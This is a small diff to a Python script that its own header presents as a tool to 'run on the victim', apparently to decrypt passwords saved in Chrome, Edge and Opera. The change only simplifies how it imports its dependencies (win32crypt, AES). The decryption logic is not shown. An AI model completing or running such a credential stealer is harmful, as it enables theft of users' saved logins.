@@ -4,16 +4,8 @@
 ##  Run on the victim, works for Chrome, Edge (Chromium) and even Opera
 ##  Tested on Local systems, Local AD systems ánd Azure AD systems
 import os, sys, json, base64, sqlite3, shutil, binascii, argparse
-try:
-    import win32crypt  ## pip install pypiwin32
-except:
-    os.system(getPythonPath() + ' -m pip install pypiwin32')
-    import win32crypt
-try:
-    from Crypto.Cipher import AES ## pip install pycryptodome
-except:
-    os.system(getPythonPath() + ' -m pip install pycryptodome')
-    from Crypto.Cipher import AES
+import win32crypt  ## pip install pypiwin32
+from Crypto.Cipher import AES ## pip install pycryptodome
 
 def get_master_key(masterkey_file):
     with open(masterkey_file, "r") as f:
